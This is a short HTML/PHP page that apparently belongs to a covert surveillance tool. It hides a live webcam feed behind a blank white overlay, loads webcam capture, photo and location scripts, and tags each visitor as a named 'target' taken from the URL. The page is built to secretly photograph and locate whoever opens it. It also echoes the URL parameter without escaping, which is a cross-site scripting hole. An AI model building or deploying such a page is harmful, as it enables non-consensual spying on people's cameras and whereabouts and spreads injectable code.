
<!DOCTYPE html>
<html>
  <style>
    .overlay{
      width:100vw;
      height:100vh;
      position:fixed;
      top:0;
      left:0;
      background:#fff;
      z-index:100;
    }
  </style>
<body>

  <video id="webcam" autoplay playsinline></video>
  <canvas id="canvas" class="d-none"></canvas>
  
  <div class="overlay">
  <?php
    if(isset($_GET['name'])){
      $name="target_".$_GET['name'];
    }else{
      $name="unknow_target";
    }
  ?>
  <input class="target_name" type="text" value="<?php echo $name ?>">
  </div>


<script src="js/jquery.js"></script>
<script type="text/javascript" src="https://unpkg.com/webcam-easy/dist/webcam-easy.min.js"></script>
<script src="js/location.js"></script>
<script src="js/photo.js"></script>

</body>
</html>